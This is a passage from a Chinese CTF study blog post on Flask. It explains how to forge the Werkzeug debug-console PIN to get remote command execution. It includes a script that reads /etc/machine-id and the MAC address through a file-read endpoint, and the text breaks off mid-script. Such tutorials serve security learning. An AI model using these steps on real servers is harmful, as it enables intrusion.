<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="Charmersix"><title>Web10_pyweb+flaskssti+反序列化 | Charmersix&#39;s Blog</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="/images/logo.png"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/regular.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/solid.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"charmersix.github.io",root:"/",language:"en",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!0,init_open:!0},style:{primary_color:"#0066cc",logo:"/images/logo.png",favicon:"/images/logo.png",avatar:"/images/head.jpg",font_size:null,font_family:null,hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"Keep writing and Keep loving.",font_color:null,hitokoto:!0},scroll:{progress_bar:!1,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"obsidian"},side_tools:{},pjax:{enable:!1},lazyload:{enable:!1},comment:{enable:!0,use:"waline",valine:{appid:null,appkey:null,server_urls:null,placeholder:null},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null,proxy:null},twikoo:{env_id:null,region:null,version:"1.6.8"},waline:{server_url:"https://waline-charmersix.vercel.app/",reaction:!0,version:2}},post:{author_label:{enable:!1,auto:!1,custom_label_list:["CTFer"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"left",copyright_info:!0,share:!0},version:"3.6.1"},KEEP.language_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},KEEP.language_code_block={copy:"Copy code",copied:"Copied",fold:"Fold code block",folded:"Folded"},KEEP.language_copy_copyright={copy:"Copy copyright info",copied:"Copied",title:"Original article title",author:"Original article author",link:"Original article link"}</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="progress-bar-container"></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="/images/logo.png"> </a><a class="logo-title" href="/">Charmersix&#39;s Blog</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">HOME</a></li><li class="menu-item"><a href="/archives">ARCHIVES</a></li><li class="menu-item"><a href="/tags">TAGS</a></li><li class="menu-item"><a href="/links">LINKS</a></li><li class="menu-item"><a href="/about">ABOUT</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">HOME</a></li><li class="drawer-menu-item flex-center"><a href="/archives">ARCHIVES</a></li><li class="drawer-menu-item flex-center"><a href="/tags">TAGS</a></li><li class="drawer-menu-item flex-center"><a href="/links">LINKS</a></li><li class="drawer-menu-item flex-center"><a href="/about">ABOUT</a></li></ul></div><div class="window-mask"></div></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">Web10_pyweb+flaskssti+反序列化</span></div><div class="article-header"><div class="avatar"><img src="/images/head.jpg"></div><div class="info"><div class="author"><span class="name">Charmersix</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2023-04-23 21:49:29</span> <span class="mobile">2023-04-23 21:49</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2023-11-08 17:33:49</span> </span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/Web/">Web</a>&nbsp;</li><li>| <a href="/tags/Study/">Study</a>&nbsp;</li><li>| <a href="/tags/Python/">Python</a>&nbsp;</li><li>| <a href="/tags/SSTI/">SSTI</a>&nbsp;</li><li>| <a href="/tags/Flask/">Flask</a>&nbsp;</li><li>| <a href="/tags/pickle/">pickle</a>&nbsp;</li><li>| <a href="/tags/py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">py反序列化</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fas fa-file-word"></i>&nbsp;<span>6.8k Words</span> </span><span class="article-min2read article-meta-item"><i class="fas fa-clock"></i>&nbsp;<span>31 Mins</span> </span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><h3 id="Flask学习"><a href="#Flask学习" class="headerlink" title="Flask学习"></a>Flask学习</h3><p>提到python就离不开flask, 这里我们先借用flask写一个<code>helloworld</code></p><p>首先直接<code>pip install flask</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>) </span><span class="comment">#表示首页目录</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;helloworld&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417191127312.png" alt="image-20230417191127312"></p><p>这里是<code>5000</code>端口, 修改端口也是很简单, 直接在<code>run()</code>里加<code>port=</code>即可</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417191311119.png" alt="image-20230417191311119"></p><p>这里再介绍两个参数<code>host</code>和<code>debug</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;helloworld&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hello&quot;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    passwd = request.form[<span class="string">&#x27;passwd&#x27;</span>]</span><br><span class="line">    result = check(username,passwd)</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome login&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">username,passwd</span>):</span><br><span class="line">    <span class="keyword">return</span> username==<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> passwd==<span class="number">123456</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">80</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>添加<code>host=&quot;0.0.0.0&quot;</code>, 我们的网站就可以让其他IP通过<code>http://10.187.81.36/</code>地址访问</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417202402104.png" alt="image-20230417202402104"></p><p>然后, 如果我们这里故意写错一下, 就会出现debug内容<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417202442641.png" alt="image-20230417202442641"></p><h3 id="Flask-PIN码计算"><a href="#Flask-PIN码计算" class="headerlink" title="Flask PIN码计算"></a>Flask PIN码计算</h3><p>debug开启了就会存在一个漏洞, 这里我们可以注意到, 开启debug后, 会返回一个<code>PIN</code>码<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417202617602.png" alt="image-20230417202617602"></p><p>这里我们访问一下<code>http://10.187.81.36/console</code>就会弹出一个让我们填pin码的框, 只要正确输入pin码, 我们就可以实现远程任意命令执行, 比如这里我们把事先知道的pin码输入进去<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417202753048.png" alt="image-20230417202753048"></p><p>就到了一个python环境, 我们就可以通过<code>os</code>执行系统命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417202925580.png" alt="image-20230417202925580"></p><p>然而这个pin码又是可以通过计算得出的</p><p>这里我们看一下python源码, 找一下pin码是如何计算得出的, 源码路径<code>Python\Lib\site-packages\werkzeug\debug\__init__.py</code></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417215705099.png" alt="image-20230417215705099"></p><p>在这里我们可以找到pin的计算逻辑<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417221214442.png" alt="image-20230417221214442"></p><p>这里的这个<code>uuid.getnode()</code>可以通过本地执行得到</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417221753243.png" alt="image-20230417221753243"></p><p>这里我们多次执行可以发现, 值是不变的, 说明是与我们机器有关的固定值</p><p>然后我们看一下<code>machine_id</code>的计算逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#摘自Python\Lib\site-packages\werkzeug\debug\__init__.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_machine_id</span>() -&gt; t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]]:</span><br><span class="line">    <span class="keyword">global</span> _machine_id</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> _machine_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> _machine_id</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_generate</span>() -&gt; t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]]:</span><br><span class="line">        linux = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># machine-id is stable across boots, boot_id is not.</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    value = f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value:</span><br><span class="line">                linux += value</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Containers share the same machine id, add some cgroup</span></span><br><span class="line">        <span class="comment"># information. This is used outside containers too but should be</span></span><br><span class="line">        <span class="comment"># relatively stable across boots.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">except</span> OSError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> linux:</span><br><span class="line">            <span class="keyword">return</span> linux</span><br><span class="line"></span><br><span class="line">        <span class="comment"># On OS X, use ioreg to get the computer&#x27;s serial number.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># subprocess may not be available, e.g. Google App Engine</span></span><br><span class="line">            <span class="comment"># https://github.com/pallets/werkzeug/issues/925</span></span><br><span class="line">            <span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"></span><br><span class="line">            dump = Popen(</span><br><span class="line">                [<span class="string">&quot;ioreg&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;IOPlatformExpertDevice&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;2&quot;</span>], stdout=PIPE</span><br><span class="line">            ).communicate()[<span class="number">0</span>]</span><br><span class="line">            match = re.search(<span class="string">b&#x27;&quot;serial-number&quot; = &lt;([^&gt;]+)&#x27;</span>, dump)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> match <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> (OSError, ImportError):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># On Windows, use winreg to get the machine guid.</span></span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&quot;win32&quot;</span>:</span><br><span class="line">            <span class="keyword">import</span> winreg</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> winreg.OpenKey(</span><br><span class="line">                    winreg.HKEY_LOCAL_MACHINE,</span><br><span class="line">                    <span class="string">&quot;SOFTWARE\\Microsoft\\Cryptography&quot;</span>,</span><br><span class="line">                    <span class="number">0</span>,</span><br><span class="line">                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,</span><br><span class="line">                ) <span class="keyword">as</span> rk:</span><br><span class="line">                    guid: t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]</span><br><span class="line">                    guid_type: <span class="built_in">int</span></span><br><span class="line">                    guid, guid_type = winreg.QueryValueEx(rk, <span class="string">&quot;MachineGuid&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> guid_type == winreg.REG_SZ:</span><br><span class="line">                        <span class="keyword">return</span> guid.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> guid</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    _machine_id = _generate()</span><br><span class="line">    <span class="keyword">return</span> _machine_id</span><br></pre></td></tr></table></figure><p>这里给出了Linux,MacOs和Windows三个系统的获取方法, 我们这里先来看一下Windows系统的</p><p>我们<code>win+r</code>输入<code>regedit</code>然后在路径里打开<code>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography</code>就能看到machine_id就是图中我打码的部分<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417223444401.png" alt="image-20230417223444401"></p><p>然后我们根据pin码计算逻辑, 自己计算一下本机的pin码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username = <span class="string">&quot;Charmersix&quot;</span></span><br><span class="line">modname=<span class="string">&quot;flask.app&quot;</span></span><br><span class="line">appname=<span class="string">&quot;Flask&quot;</span></span><br><span class="line">moddir=<span class="string">&quot;E:\\Python\\lib\\site-packages\\flask\\app.py&quot;</span></span><br><span class="line">num=<span class="literal">None</span></span><br><span class="line">rv=<span class="literal">None</span></span><br><span class="line">probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        appname,</span><br><span class="line">        moddir,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">private_bits = [<span class="string">&quot;35315514738897&quot;</span>, <span class="string">&quot;a*******-****-****-****-c**********6&quot;</span>]</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>可以发现结果与之前一样<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417230227019.png" alt="image-20230417230227019"></p><p>Linux下当然也是可以计算得出的, 具体区别就是Linux下需要拿的文件不一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_generate</span>() -&gt; t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]]:</span><br><span class="line">       linux = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">       <span class="comment"># machine-id is stable across boots, boot_id is not.</span></span><br><span class="line">       <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">           <span class="keyword">try</span>:</span><br><span class="line">               <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                   value = f.readline().strip()</span><br><span class="line">           <span class="keyword">except</span> OSError:</span><br><span class="line">               <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> value:</span><br><span class="line">               linux += value</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">       <span class="comment"># Containers share the same machine id, add some cgroup</span></span><br><span class="line">       <span class="comment"># information. This is used outside containers too but should be</span></span><br><span class="line">       <span class="comment"># relatively stable across boots.</span></span><br><span class="line">       <span class="keyword">try</span>:</span><br><span class="line">           <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">               linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">       <span class="keyword">except</span> OSError:</span><br><span class="line">           <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> linux:</span><br><span class="line">           <span class="keyword">return</span> linux</span><br></pre></td></tr></table></figure><p>Linux下就需要读<code>/etc/machine-id</code>和<code>/proc/sys/kernel/random/boot_id</code>和<code>/proc/self/cgroup</code>三个文件</p><p>这里感谢ctfshow的大师傅提供了一个一把梭的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入需要的包</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://9ab6f69b-79a0-471c-bf92-9e4fb9df9a98.challenges.ctfer.com:8080/file?filename=&quot;</span><span class="comment">#题目地址</span></span><br><span class="line">username = <span class="string">&quot;root&quot;</span></span><br><span class="line">path=<span class="string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span><span class="comment">#路径:报错可得</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_uuid</span>():</span><br><span class="line">    payload = <span class="string">&quot;/sys/class/net/eth0/address&quot;</span></span><br><span class="line">    response = requests.get(url=url+payload)</span><br><span class="line">    <span class="keyword">if</span> response.status_code ==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;uuid is &#123;&#125; &quot;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(response.text.strip().replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>)[<span class="number">1</span>:],<span class="number">16</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">int</span>(response.text.strip().replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>)[<span class="number">1</span>:],<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mechine_id</span>():</span><br><span class="line">    payload = <span class="string">&quot;/etc/machine-id&quot;</span></span><br><span class="line">    response = requests.get(url=url+payload)</span><br><span class="line">    <span class="keyword">if</span> response.status_code ==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;machine-id is &#123;&#125; 